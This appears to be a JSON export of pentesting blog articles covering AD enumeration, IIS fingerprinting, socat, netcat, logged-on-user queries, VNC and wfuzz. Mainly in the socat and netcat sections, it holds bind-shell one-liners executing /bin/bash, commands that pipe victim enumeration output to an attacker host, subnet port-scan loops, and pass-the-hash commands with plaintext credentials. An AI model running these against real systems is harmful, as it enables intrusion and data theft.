|\n| --- | --- |\n| 30 | Windows Server 2003 operating system |\n| 31 | Windows Server 2003 R2 operating system |\n| 44 | Windows Server 2008 operating system (AD DS) |\n| 47 | Windows Server 2008 R2 operating system (AD DS) |\n| 56 | Windows Server 2012 operating system (AD DS) |\n| 69 | Windows Server 2012 R2 operating system (AD DS) |\n| 87 | Windows Server 2016 operating system (AD DS) |\n| 88 | Windows Server v1803 operating system (AD DS) |\n\n### Trusts\n\nEnumerate the trusts from the specified domain\n\n```\ndsquery * \"CN=System,DC=MARVEL,DC=LAB\" -filter \"(objectClass=trustedDomain)\" -attr trustPartner flatName\n```\n\nFind a DC for each trusted domain\n\n```\nfor /f \"skip=1\" %i in ('\"dsquery * CN=System,DC=MARVEL,DC=LAB -filter (objectClass=trustedDomain) -attr *\"') do nltest /dsgetdc:%i\n```\n\n### Sites & Subnets\n\nAD Site Information\n\n```\ndsquery * \"CN=Sites,CN=Configuration,DC=MARVEL,DC=LAB\" -attr cn description location -filter \"(objectClass=site)\"\n```\n\nSite Links and Cost\n\n```\ndsquery * \"CN=Sites,CN=Configuration,DC=MARVEL,DC=LAB\" -attr cn costdescription replInterval siteList -filter \"(objectClass=siteLink)\"\n```\n\nAD Subnet and Site Information\n\n```\ndsquery * \"CN=Subnets,CN=Sites,CN=Configuration,DC=MARVEL,DC=LAB\" -attr cn siteObject description location\n```"},{"fields":{"slug":"/iis-version-header-server-lookup"},"excerpt":"| Version | Operating system | Launch Date | End Of Support | | --- | --- | --- | --- | | IIS 4 | Windows NT 4 | 1996 | 2006 | | IIS 5…","frontmatter":{"date":"17th June 2022 ","title":"IIS Version Header Server Lookup","description":"List of IIS Web Servers, their associated operating system version releases, the corresponding launch dates and end-of-support dates. These can be useful for fingerprinting Window Servers when you find an HTTP Header Showing an ISS Version on an assessment.","tags":"enumeration, iis","posttype":"article"},"body":"\n\n| Version | Operating system | Launch Date | End Of Support |\n| --- | --- | --- | --- |\n| IIS 4 | Windows NT 4 | 1996 | 2006 |\n| IIS 5 | Windows 2000 | 1999 | 2010 |\n| IIS 6 | Windows Server 2003 | May 28, 2003 | Jul 14, 2015 |\n| IIS 7 | Windows Server 2008 | May 6, 2008 | Jan 14, 2020 |\n| IIS 7.5 | Windows Server 2008 R2 | Oct 22, 2009 | Jan 14, 2020 |\n| IIS 8 | Windows Server 2012 | 2012 | Oct 10, 2023 |\n| IIS 8.5 | Windows Server 2012 R2 | 2013 | Oct 10, 2023 |\n| IIS 10 | Windows Server 2016 | 2016 | Jan 12, 2027 |\n| IIS 10 | Windows Server 2019 | 2018 | Jan 9, 2029 |"},{"fields":{"slug":"/aws-efs-nfs-file-system-security-checklist"},"excerpt":"No pun intended! This acts as a Quick Checklist for securing your AWS EFS Instances. EFS is Amazon’s implementation of the network file…","frontmatter":{"date":"16th June 2022 ","title":"AWS EFS NFS file system Security Checklist","description":"AWS EFS (NFS file system); Quick Security Hardening Guide - This acts as a Quick Checklist to configuring your AWS EFS securely. This is Amazon’s implementation of the network file system or NFS protocol for Amazon’s cloud customers.","tags":"aws, cloud","posttype":"article"},"body":"\n# AWS EFS (NFS file system); Quick Security Hardening Guide\n\nNo pun intended!\n\nThis acts as a Quick Checklist for securing your AWS EFS Instances. EFS is Amazon’s implementation of the network file system or NFS protocol for Amazon’s cloud customers. In less than four steps!\n\nThe information provided is my own advise. I hope to provide you with a better understanding about AWS EFS and how you can use it securely. See the external references for supporting material.\n\nLet's get configuring!\n\n## Checklist \n\n\t1.\tEncryption : enabled by default, however consider checking it is configured securely. Refer to Amazon if in doubt.\n\t2.\tNetwork access: make sure that default security groups have been removed; only security groups created by you can access the mounted file system(s). This limits the file system access to only relevant parties. \n\t3.\tConsider using unique SSH keys to access each Instance: an Amazon EFS instance. Compromised keys cannot be reused on multiple machines (i suspect you are using unique and strong SSH keys)\n\t4.\tSee other ideas in the external references.  \n\n### References:\n\nEdureka!, AWS EFS Tutorial: https://m.youtube.com/watch?v=yKhE2hzlbqA\nAmazon, on AWS EFS security: https://docs.aws.amazon.com/efs/latest/ug/security-considerations.html"},{"fields":{"slug":"/socat"},"excerpt":"socat [options] <address> <address> You have to provide both addresses for it to work, each address will be made up like this\n\nprotocol:ip…","frontmatter":{"date":"13th June 2022 ","title":"Socat","description":"In today's article, we will look at Socat. Socat is a network utility similar to Netcat. Socat supports IPv6 and SSL and is available for both Windows and Linux. The first thing you will notice with this tool is that it has a different syntax than what you are used to with Netcat or other standard Unix tools.","tags":"socat","posttype":"tutorial"},"body":"# Socat\n\n\n```\nsocat [options] <address> <address>\n```\n\nYou have to provide both addresses for it to work, each address will be made up like this\n```\nprotocol:ip:port\n```\n\nExamples showing the same functionality as Netcat\n\n```\nnc localhost 80\nsocat - TCP4:localhost:80 \nOR \nsocat STDIN TCP4:localhost:80\n\nnc -lp localhost 700\nsocat TCP4-LISTEN:700 STDOUT\n\nnc -lp localhost 700 -e /bin/bash\nsocat TCP4-LISTEN:700 EXEC:/bin/bash\n```\n\nWe can go beyond Netcat with some SSL examples, but first, we need to generate an SSL cert for the server. Generate an SSL cert\n```\nopenssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key\n```\n\nSSL server\n\n```\nsocat OPENSSL-LISTEN:443,cert=/cert.pem -\n```\n\nSSL client\n\n```\nsocat - OPENSSL:localhost:443\n```\n\nBoth addresses don’t have to use the same protocol, so you can do `ssl server -> non-ssl server`. You should also check out the options that you can apply, for example you can use fork to tell socat to listen and handle multiple clients.\n\n```\nsocat TCP4-LISTEN:5000,fork OPENSSL:localhost:443\n```\n\nFinally if you are tunnelling a connection between servers using socat you can use the -v option to print all the traffic to stdout."},{"fields":{"slug":"/windows-query-logged-on-users"},"excerpt":"Logon Types | Type | Meaning | | --- | --- | | 0 | SYSTEM account logon, typically used by the computer itself. | | 2 | Interactive Logon -…","frontmatter":{"date":"10th June 2022 ","title":"Windows Query Logged On Users","description":"As a pentester, there are plenty of situations where we need to view who is logged on to a given computer remotely. Often we not only need to check who is logged on interactively at the console but also who is connected remotely via a Remote Desktop Connection. This article will discuss server non-invasive ways of doing this.","tags":"wmic","posttype":"article"},"body":"\n# Query Logged On Users\n\nLogon Types\n\n| Type | Meaning |\n| --- | --- |\n| 0 | SYSTEM account logon, typically used by the computer itself. |\n| 2 | Interactive Logon - terminal services, console, directly interact with the system |\n| 3 | Network Logon - For things like WMI, SMB, and other remote protocols (non-interactive) |\n| 5 | Service Logon |\n| 10 | Remote Interactive Logon |\n\nOn some machines, you may need to enable remoting.\n\n```\nnetsh firewall set service remoteadmin enable\n```\n\nManually with wmic command line\n\n```\nwmic logon where LogonType=2 GET LoginID, LogonType\nwmic path Win32_LoggedOnUser | find \"273995\"\nwmic \\node:10.50.1.254 \\user:marvel.lab\\troy.wood \\password:\"password123\" path Win32_LoggedOnUser\n```\n\nUsing WMiQuery\n\n```\nwmiquery.py 'Administrator:Passw0rd!@10.50.1.254'\nselect LogonType, LogonID from Win32_logonsession where LogonType=2\n```\n\nUsing PTH-Wmic\n\n```\npth-wmic -U \"marvel.lab\\Administrator%Passw0rd!\" \\\\10.50.1.254 'select LogonType, LogonID from Win32_logonsession where LogonType=2'\npth-wmic -U \"marvel.lab\\Administrator%Passw0rd!\" \\\\10.50.1.254 'select * Win32_loggedonuser'\n```\n\nUsing Sysinternals PsLoggedOn64\n\n```\npsexec.py -c \\pentesting\\PsLoggedon64.exe 'marvel.lab\\Administrator:Passw0rd!@10.50.1.15' \"-l -accepteula\"\n```\n\n```\nnbtscan -r 10.50.1.0\\24 | grep ^10 | awk '{ print $1 }' > \\tmp\\nbtscan.txt\nfor ip in $(cat \\tmp\\nbtscan.txt); do psexec.py -c \\pentesting\\PsLoggedon64.exe marvel.lab\\Administrator:Passw0rd\\!@${ip} \"-l -accepteula\"; done >> \\tmp\\loggedon.txt\n```"},{"fields":{"slug":"/netcat"},"excerpt":"First some brief points about Netcat All official versions are free of chargeWorks natively on Linux.Works natively on Apple Mac OS X.W…","frontmatter":{"date":"8th June 2022 ","title":"Netcat","description":"This article looks at Netcat, a valuable tool in the pentesters toolbox. Hobbit released the original Netcat in 1995, but it hasn’t been maintained despite its popularity. It can sometimes be hard to find a copy of the v1.10 source code. The flexibility and usefulness of this tool prompted the Nmap Project to produce Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.","tags":"netcat","posttype":"tutorial"},"body":"\n# Netcat\n\nFirst some brief points about Netcat\n- All official versions are free of charge\n- Works natively on Linux.\n- Works natively on Apple Mac OS X.\n- Works natively on Microsoft Windows.\n- Features a command-line interface.\n- Source code available for inspection.\n- General-purpose tools\n- Packet crafting tools\n\nThe `ncat` tool is a much better option in place of netcat or nc. \n\nWe think `ncat` is better because of its support for multiple protocols and simultaneous connections and SSL.\n\n\n## Overview\n\nThis simple utility reads and writes data across TCP or UDP network connections. It is designed to be a reliable back-end tool to use directly or easily drive by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need, including port binding to accept incoming connections.\n\n> Netcat can operate in environments where you have low privileges, plus it is a standalone binary, meaning you can upload it to an environment and run it as is.\n> Be warned that file transfers using Netcat are not encrypted, anyone on the network can grab what you are sending, so use this only on trusted networks.\n\n## Standard Listen and Send\n\nsetup netcat in listening mode and save whatever is received to `in.txt`\n```\nroot@box:/tmp/netcat# nc -w 1 -l -p 3000 > in.txt\n```\n\nFrom the sending end, we can pipe in a file called `out.txt` and send it to our listener.\n```\nnc -w 3 [destination] 3000 < out.txt\n```\n\n## Piping input\n\nWe can send data by sending output through a pipe to Netcat. Here we are outputting a file, but it could be several items.\n```\nC:\\Documents and Settings\\user> type c:\\test.txt | c:\\nc.exe 192.168.2.8 3000 -w1\n```\n\nOn our kali box, we can set a while loop like follows.\n```\nroot@evilsaint:/pentesting/enum# while true; do nc -w 4 -lvp 4321 >> enum.txt; done\n```\n\nAnd we can pipe enumeration commands back to our box.\n```\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>ipconfig | nc64.exe 10.1.1.5 4321 -w 3\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>net user | nc64.exe 10.1.1.5 4321 -w 3\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>net account | nc64.exe 10.1.1.5 4321 -w 3\n```\n\n## Send with Compression (Linux to Linux)\n\nOn the receiving end\n```\nnc -l -p 1234 | uncompress -c | tar xvfp -\n```\n\nOn the sending end\n```\ntar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234\n```\n\n## Sending a harddrive\n\nIt is possible using Netcat to pipe a hardrive\n\nOn the sender end run\n```\ndd if=/dev/hda3 | gzip -9 | nc -l 3333\n```\n\nOn the receiver end,\n```\nnc [destination] 3333 | pv -b > hd-image.img.gz\n```\n\n### Port Scanning with Netcat\n\nTCP scan of ports 3385 to 3395\n```\nnc -nvv -w 1 -z 10.0.0.1 3385-3395\n```\n\nUDP scan of ports 3385 to 3395\n```\nnc -unvv -w 1 -z 10.0.0.1 3385-3395\n```\n\nSmall Bash Loop to loop through all the ports from 1 to 65535 for one IP\n```\nfor i in $(seq 1 65535); do nc -nv -w 1 -z 10.0.0.1 $i ; done\n```\n\nSmall Bash Loop to loop through all the IPs on our subnet and scan for ports 21-25\n```\nfor i in {1..254}; do nc -vv -n -w 1 10.0.0.$i 21-25 -z; done\n```\n\n| Option | Description |\n| --- | --- |\n| -n | don't resolve first just use the IP address and don't try and use DNS to get a hostname |\n| -vv | single -v is verbose, double v -vv is extra verbosity. |\n| -u | UDP mode. |\n| -w | equals the timeout in seconds for net reads |\n| -z | Zero I/O mode used for scanning. |\n\n### Makeshift Permanent Netcat Listener\n\n`nohup` is a program you can use to run your application with such that its stdout/stderr can be sent to a file instead and such that closing the parent script won’t SIGHUP the child. However, you need to have the foresight to use it before starting the application. Because of how `nohup` works, you can’t just apply it to a running process.\n\n`disown` is a bash builtin that removes a shell job from the shell’s job list. This means that you can’t use `fg`, `bg` on it anymore, but more importantly, when you close your shell, it won’t hang or send a SIGHUP to that child anymore. Unlike `nohup`, disown is used after the process has been launched and backgrounded.\n\nMake a Netcat listener persistent.\n```\nwhile(1) nohup netcat -lvp 4444\n```"},{"fields":{"slug":"/linux-connectivity"},"excerpt":"ifconfig is part of the net-tools package.ip is an alternative command from iproute2util package. View IP Addresses\n\nifconfig\nip a\n\nAddin…","frontmatter":{"date":"6th June 2022 ","title":"Linux Connectivity","description":"A look at various commands that can be used for configuring Linux network connectivity.","tags":"networking","posttype":"article"},"body":"# Linux Connectivity\n\n- `ifconfig` is part of the `net-tools` package.\n- `ip` is an alternative command from `iproute2util` package.\n\nView IP Addresses\n\n```\nifconfig\nip a\n```\n\n## Adding or Deleting an IP Address\n\nifconfig\n\n```\nifconfig eth0 add 192.168.80.174\nifconfig eth0 del 192.168.80.174\n```\n\nip\n\n```\nip a add 192.168.80.174 dev eth0\nip a del 192.168.80.174 dev eth0\n```\n\nstatic interface configurations (\\etc\\network\\interfaces).\n\n```\nauto lo\niface lo inet loopback\n\nauto eth0\niface eth0 inet static u\naddress 192.168.20.9\nnetmask 255.255.255.0\ngateway 192.0.2.254\n```\n\n## Add MAC Hardware Address to Network Interface\n\nifconfig\n\n```\nifconfig eth0 hw ether 00:0c:29:33:4e:aa\n```\n\nip\n\n```\nip link set dev eth0 address 00:0c:29:33:4e:aa\n```\n\n## Enabling or Disabling Network Interface\n\nifconfig\n\n```\nifconfig eth0 down\nifconfig eth0 up\n```\n\nip\n\n```\nip link set dev eth0 down\nip link set dev eth0 up\n```\n\n## Enable\\Disable ARP Protocol\n\nifconfig\n\n```\nifconfig eth0 arp\nifconfig eth0 -arp\n```\n\nip\n\n```\nip link set dev eth0 arp on\nip link set dev eth0 arp off\n```\n\n## Gateway and Routes\n\nroute\n\n```\nroute add default gw <ip>\nroute add -net 192.168.10.0 netmask 255.255.255.0 dev eth0\nroute\n```\n\nip\n\n```\nip route add default via <gw addr>\nip route add <ip> via <gw addr> dev <interface>\nip route show\n```\n\n## DHCP\n\nRequest IP Address (Sends broadcast)\n\n```\ndhclient\n```\n\nMore advanced request, forces IPv4, against the specified server for the specified interface\n\n```\ndhclient -4 -s 10.128.128.128 eth0\n```\n\n## vConfig\n\nCheck if 8021q is loaded:\n\n```\nlsmod | grep 8021q\n```\n\nIf not:\n\n```\nmodprobe 8021q\n```\n\nAdd vConfig\n\n```\nvconfig add eth0 5\n```\n\nCheck:\n\n```\nifconfig eth0.5\n```\n\n```\nifconfig eth0.5 192.168.1.100 netmask 255.255.255.0 broadcast 192.168.1.255 up\nifconfig eth0.5 x.x.x.x netmask x.x.x.x broadcast x.x.x.x up\n```\n\nTo delete:\n\n```\nifconfig eth0.5 down\nvconfig rem eth0.5\n```\n\nOR:\n\n```\nip link add link eth0 name eth0.5 type vlan id 5\nip link\nip -d link show eth0.5\n```\n\nYou need to activate and add an IP address to vlan link, type:\n\n```\nip addr add 192.168.1.200\\24 brd 192.168.1.255 dev eth0.5\nip link set dev eth0.5 up\n```\n\nTo remove:\n\n```\nip link set dev eth0.5 down\nip link delete eth0.5\n```"},{"fields":{"slug":"/git-error-fatal-protocol-error-bad-line-length-character"},"excerpt":"On the weekend I ran into an problem with Git that couldnt debug fatal: protocol error: bad line length character: Warn\n\n\nhttps…","frontmatter":{"date":"5th June 2022 ","title":"Git Error - fatal: protocol error: bad line length character","description":"","tags":"git","posttype":"blog"},"body":"On the weekend I ran into an problem with Git that couldnt debug\n\n```\nfatal: protocol error: bad line length character: Warn\n```\n\n\nhttps://stackoverflow.com/questions/8170436/git-remote-error-fatal-protocol-error-bad-line-length-character-unab"},{"fields":{"slug":"/connecting-linux-to-active-directory"},"excerpt":"Change Password of AD User from Linux Change the password of a regular user with net rpc\n\nroot@kali:~# net rpc password adminuser -U…","frontmatter":{"date":"1st June 2022 ","title":"Connecting Linux To Active Directory","description":"There are several benefits to connecting a Linux OS to Active Directory instead of leaving it as a stand alone. Because of this, you do sometimes see this configuration on client engagements and it is useful to test out how a Linux box shows up in your enumeration tools. This article details how you can connect both Debian and Centos based systems to Active Directory for setting up a home lab.","tags":"active-direction, linux","posttype":"article"},"body":"# Connecting Linux To Active Directory\n\n### Change Password of AD User from Linux\n\nChange the password of a regular user with `net rpc`\n\n```\nroot@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10\nEnter new password for adminuser:\nEnter helpdesk's password:\nroot@kali:~#\n```\n\nChange the password of a regular user with `rpcclient`\n\n```\nroot@kali:~# rpcclient -U helpdesk \\\\192.168.80.10\nEnter helpdesk's password:\nrpcclient $> setuserinfo2 normaluser 23 'Passw0rd!'\n```\n\n### Connect CentOS to Active Directoy\n\nInstall the following packages\n\n```\nyum install sssd realmd oddjob oddjob-mkhomedir adcli samba-common samba-common-tools krb5-workstation openldap-clients policycoreutils-python\n```\n\nUpdate the `/etc/hosts` file\n\n```\n192.168.0.151    adserver.example.com  adserver\n```\n\nContents of `resolv.conf` should be something like below\n\n```\ncat /etc/resolv.conf\n\nsearch example.com\nnameserver 192.168.0.151\n```\n\nJoin the domain\n\n```\nrealm join --user=tech adserver.example.com\nPassword for tech:\n```\n\nVerify we are now joined.\n\n```\nrealm list\n```\n\nCheck an verify users with full domain\n\n```\nid linuxtechi@example.com\n```\n\nTo make this work without full domain\n\n```\nnano /etc/sssd/sssd.conf\n\nuse_fully_qualified_names = False\nfallback_homedir = /home/%u\n```\n\n### Connect Debian to Active Directoy\n\nConfigure the network interfaces\n\n```\nnano  /etc/network/interfaces\n```\n\nAdd the ip address of the domain controller like follows\n\n```\nauto ens192\niface ens192 inet static\naddress 10.100.1.250\ngateway 10.100.1.1\nnetwork 10.100.1.0\nbroadcast 10.100.1.255\ndns-nameservers 10.100.1.254\n```\n\nRestart the interface config\n\n```\n/etc/init.d/networking restart\n```\n\nInstall the following packages\n\n```\napt -y install realmd sssd sssd-tools adcli krb5-user packagekit samba-common samba-common-bin samba-libs resolvconf\n```\n\nnano 5.conf\n\n```\n[logging]\n        Default = FILE:/var/log/krb5.log\n\n[libdefaults]\n        ticket_lifetime = 24000\n        clock-skew = 300\n        default_realm = MARVEL.LAB\n#       dns_lookup_realm = false\n#       dns_lookup_kdc = true\n\n[realms]\n        MARVEL.LAB = {\n                kdc = DC01.MARVEL.LAB:88\n                admin_server = DC01.MARVEL.LAB:464\n                default_domain = MARVEL.LAB\n\n}\n\n[domain_realm]\n        .server.com = MARVEL.LAB\n        server.com = MARVEL.LAB\n```\n\nVerify connection\n\n```\nkinit Administrator@MARVEL.LAB\nklist\n```\n\n**Extra config to come back and do**\n\nhttps:.debian.org\n\nInstall the following tools `apt-get install winbind samba`\n\nnano .conf\n\n```\n[global]\n        security = ads\n        realm = MARVEL.LAB\n        password server = 10.100.1.254\n        workgroup = test\n#       winbind separator = +\n        idmap uid = 10000-20000\n        idmap gid = 10000-20000\n        winbind enum users = yes\n        winbind enum groups = yes\n        template homedir = \\home\\%D\\%U\n        template shell = \\bin\\bash\n        client use spnego = yes\n        client ntlmv2 auth = yes\n        encrypt passwords = yes\n        winbind use default domain = yes\n        restrict anonymous = 2\n        domain master = no\n        local master = no\n        preferred master = no\n        os level = 0\n```\n\nAdd the following line to the bottom of the common-session pam module\n\n```\nnano /etc/pam.d/common-session\n# add to the end if need (create home directory automatically at initial login)\nsession optional        pam_mkhomedir.so skel=/etc/skel umask=077\n```\n\nJoin to domain\n\n```\nrealm join marvel.lab\n```"},{"fields":{"slug":"/exploring-vnc-servers-and-clients"},"excerpt":"VNC works on a client and server model. A server component is installed on the remote computer (the one you wish to control), and a VNC…","frontmatter":{"date":"29th May 2022 ","title":"Exploring VNC Servers And Clients","description":"This article looks at several different VNC Server technologies, and we perform a number of actions on them including installing and configuring them. We then look at interacting with them via connection with a VNC Client.","tags":"vnc","posttype":"article"},"body":"# VNC Servers & Clients\n\nVNC works on a client and server model. A server component is installed on the remote computer (the one you wish to control), and a VNC viewer (the client) is installed on the computer from where you want to take control. Over the VNC protocol, the remote computer with the agent installed will transmit a copy of the remote computer’s screen to the viewer. The most common VNC Server I found myself using was TigerVNC which is forked off of TightVNC. It allows users to create an independent session. However, it can not do shared screens or allow requesting assistance so its mileage on pentests is limited to just the protocol. If however, you have a choice between the two then x11vnc can turn out a little better on pentests.\n\n## Tiger VNC\n\nWebsite: http://tigervnc.org\n\nTight VNC and Tiger VNC originated from the same project. Tiger VNC branched off from the never released VNC 4 branch of TightVNC. It has a GPL license and is free for personal and commercial use. It can operate as a server and client on MS Windows, Linux and FreeBSD. On Mac, it can just act as a client. It supports SSL/TLS Encryption.\n\nUnfortunately, TigerVNC doesn't support File Transfer.\n\n### Installing\n\nIf you install the `vnc4server` package it will also install `tigervnc-standalone-server`, which has replaced `tigervnc-server`\n\n```\napt-get install vnc4server\n```\n\nMade up of the following commands\n\n- [vncconfig](http://tigervnc.org/doc/vncconfig.html)\n- [vncpasswd](http://tigervnc.org/doc/vncpasswd.html)\n- [vncserver](http://tigervnc.org/doc/vncserver.html)\n- [vncviewer](http://tigervnc.org/doc/vncviewer.html)\n- [x0vncserver](http://tigervnc.org/doc/x0vncserver.html)\n- [Xvnc](http://tigervnc.org/doc/Xvnc.html)\n\n### Running a VNC Server\n\nThe following line runs `vncserver` . The `-name` parameter allows us to specify a display name for the session window. We can use the `-geometry` to specify dimensions (WxH) for the connecting session. We can specify the colour depth (16/24/32) using the `-depth` parmeter. The `-localhost` parameter can be yes or no as whether or not to listen locally. Adding `-cleanstale` tells TigerVNC Server to clean up any stale files before trying to work out what x display number is available. Lastly `-autokill` kills the TigerVNC\n\n```\nvncserver -name \"My Window Title\" -geometry \"1600x1000\" -depth 24 -localhost no  -cleanstale -autokill\n```\n\nIf you have been working on any previous connections and you don't want to worry about closing them down before starting a new session then you can append on the following command to kill all previously existing server sessions.\n\n```\n-kill :*\n```\n\nDepending on your target audience, you can also specify\n\nNever treat incoming connections as shared. If a second person connects it disconnects. Good option as you at least know if someone is connected.\n\n```\n--NeverShared\n```\n\nAlways treat the session as shared. If you share the connection and use the ‘view only’ password, you can perform a presentation to many.\n\n```\n-AlwaysShared\n```\n\nSpecify the allowed users\n\n```\n-AllowedUsers users\n```\n\n### Manage VNC Sessions\n\nTo list any VNC Sessions that have been setup.\n\n```\nvncserver -list\n```\n\nKill a display (or all displays)\n\n```\nvncserver -kill :1\nvncserver -kill :*\n```\n\n### Authentication\n\nFor your session, you will need to authenticate\n\nThe VNC Password is stored in `/.vnc.passwd` of the person who started the service. Type the following to be prompted for a password.\n\n```\nvncpasswd\n```\n\nA nice way to connect is over SSH\n\n```\nvncviewer -via root@46.101.90.247 :1\n```\n\n### Configuration\n\nThe `~/.vnc/Xvnc-session` file used to be `~/.vnc/xstartup` and because of such, TigerVNC will check both. The file `/etc/vnc.conf` is the global configuration file. Passwords are stored in `~/.vnc/passwd`\n\n## x11vnc\n\nhttp://www.karlrunge.com/x11vnc/\n\nHas TightVNC and UltraVNC file transfer built-in along with built-in SSL encryption and authentication.\n\n- Runs of the command line\n- Supports lots of graphical environments\n\n### Installing\n\nOn Debian Linux, it is normally an easy install with the package manager\n\n```\napt-get install x11vnc\n```\n\nWith centos 9 you need to pull down the binary\n\n```\nwget http://dl.fedoraproject.org/pub/epel/7/x86_64/x/x11vnc-0.9.13-11.el7.x86_64.rpm\nyum install Xvfb\nyum install libvncserver\nyum install tk\nrpm -i --allfiles -v x11vnc-0.9.13-11.el7.x86_64.rpm\n```\n\n### Running a VNC Server\n\nTo set a password file for x11vnc, use the `-storepasswd` parameter. By default, it will save it in `~/.vnc/passwd` unless you specify it elsewhere\n\n```\nx11vnc -storepasswd\n```\n\nRun a session specify a clear-text password credential of ‘truffle’\n\n```\nx11vnc -passwd truffle\n```\n\nThe `-forever` flag will keep x11vnc listening for further connections rather than exiting.\n\n```\nx11vnc -passwd truffle -forever\n```\n\nWe can specify the window geometry of connections along with a name\n\n```\nx11vnc -passwd truffle -forever -desktop \"Desktop Name\"\n```\n\nInstead of specify a plain text password on the command line you can include your file. If you want to put your password in plain text in a file you can simply use `-passwdfile`. However more commonly you will want to use the password you created with the `-storepasswd` flag and for that you specify `-rfbauth`\n\n```\nx11vnc -forever -desktop \"Desktop Name\" -passwdfile /root/unencrypted-pass\nx11vnc -forever -desktop \"Desktop Name\" -rfbauth /root/.vnc/passwd\n```\n\nA good idea is to also restrict access based on ip address if possible.\n\n```\nx11vnc -forever -desktop \"Desktop Name\" -rfbauth /root/.vnc/passwd -allow xx.xxx.xx.xxx\n```\n\nIf you need to run x11vnc on a non-standard port you can specify it with the `-rfbport`\n\n```\nx11vnc -forever -desktop \"Desktop Name\" -passwdfile /root/.vnc/cleartext -rfbport 7777\n```\n\nA secondary password can be supplied for those only allowed to view the session\n\n```\nx11vnc -forever -desktop \"Desktop Name\" -rfbauth /root/.vnc/passwd -viewpasswd \"no-touching!\"\n```\n\n> -tightfilexfer Enable the TightVNC file transfer extension.\n>  -ultrafilexfer Enable UltraVNC filetransfer\n\n| Option | Description |\n| --- | --- |\n| -shared | When display is shared more than one person can connect at once. (defaults to off) |\n| -geometry | WxH |\n| -forever | Keep listening for more connections rather than exiting. |\n| -once | Exit after the first successfully connected viewer disconnects |\n| -allow | Specify the IP addresses (separated by commas) of the allowed hosts |\n| -unixpw | List of comma-separated user names of system users that can login |\n| -ssl | Use the openssl library to provide a built-in encrypted SSL/TLS tunnel between server and viewers |\n| -passwd | Add a plain password to the connection |\n| -desktop | Set Desktop name for clients |\n| -chatwindow | Place a local UltraVNC chat window on the X11 display |\n\n## Viewing VNC\n\nOn client install the VNC viewer\n\n```\napt-get install xtightvncviewer\n```\n\nThe basic syntax for viewing the server.\n```\nvncviewer 54.244.102.175\n```\n\nIf the server is running on a different display (n = display number)\n```\nvncviewer 54.244.102.175:n\n```\n\nIf we get tired of typing out a password on the terminal, we can reference it via a file\n```\nvncviewer 45.76.134.217 -passwd <path to my password file>\n```\n\nAn alternative to the Tight VNC Viewer is SSVNC, an enhanced version of Tight VNC with support for more encodings, colour modes, and extensions.\n```\napt-get install ssvnc\nssvncviewer 46.101.74.11:1\n```"},{"fields":{"slug":"/wfuzz"},"excerpt":"Wfuzz provides some highly customisable fuzzing options that take it beyond a simple hidden content discovery tool. You must be familiar…","frontmatter":{"date":"22nd May 2022 ","title":"Wfuzz","description":"Wfuzz is a tool designed for fuzzing Web Applications. It can be used for finding direct objects not referenced within a website such as files and folders, it allows any HTTP request filed to be injected such as parameters, authentication, forms and headers. It is modular and extendable by plugins and can check for different kinds of injections such as SQL, XSS and LDAP.","tags":"brute-force, web","posttype":"article"},"body":"# Wfuzz\n\nWfuzz provides some highly customisable fuzzing options that take it beyond a simple hidden content discovery tool.\n\nYou must be familiar with a few non-obvious options before you use the tool.\n\n| Flag | Description |\n| --- | --- |\n| -e | List of available encoders/payloads/iterators/printers/scripts |\n| -c | Output with colours |\n| -z | payload |\n| -R depth | Recursive path Discovery |\n| –hc | Hide content, so for example, hide 404 results. |\n| –sc | Show content with specified code, i.e. 200 |\n| -p addr | Use Proxy in format ip:port:type |\n| FUZZ | The parameter you want fuzzing. If you use the -V option, this is unnecessary as it will do all parameters. |\n\nInstalling the tool\n```\nsudo apt install wfuzz\n```\n\nTypical usage syntax.\n\n```bash\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://website/FUZZ\n```\n\nLook for pages ending in a `.php` extension.\n\n```bash\nwfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://website/FUZZ.php\n```\n\n## Output\n\nWe can fuzz via a proxy using the `-p` option syntax.\n\n```bash\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt -p 127.0.0.1:8080 http://website/FUZZ\n```\n\nWhen writing to a file, wfuzz has some choices. To see available formats\n\n```bash\nwfuzz -e printers\n```\n\nWe can specify a format like so\n\n```bash\nwfuzz -f nonauth.txt,raw  -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://website/FUZZ\nwfuzz -f myoutput,html -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://website/FUZZ\nwfuzz -f moreoutput,json -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://website/FUZZ\nwfuzz -f anotheroutput,magictree -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://website/FUZZ\n```\n\n## Cookies\n\nWe can add cookies to our syntax (if the cookies contain characters that will escape the bash shell you need to quote them)\n\n```bash\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -b mycookie=true -b secondcookies=joiQXV0aFNlcnZlciIsImp http://website/FUZZ\n```\n\nCookies can also be fuzzed using the `FUZZ` keyword\n\n```bash\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -b mycookie=FUZZ http://website/FUZZ\n```\n\n## Useragent\n\nSome filters might be looking for common tool user-agent signatures. You can specify one as follows\n\n```bash\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -H \"User-Agent: evilbrowser\" http://website/FUZZ\n```\n\n## Recursion\n\nTo instruct recursion simply add the `-R` parameter followed by a depth\n\n```bash\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 -R1 https://pentesting.optasense.com/FUZZ\n```\n\n## Scripts\n\nSome locations where wfuzz scripts might be installed depending on version of kali.\n\n```bash\nls -l /usr/lib/python2.7/dist-packages/wfuzz/plugins/scripts/\nls -ls /usr/share/wfuzz/plugins/scripts/\n```\n\nWe can see a list of scripts using the `-e` option\n\n```bash\nwfuzz -e scripts\n```\n\nRun default scripts (`--script=default`)\n\n```bash\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 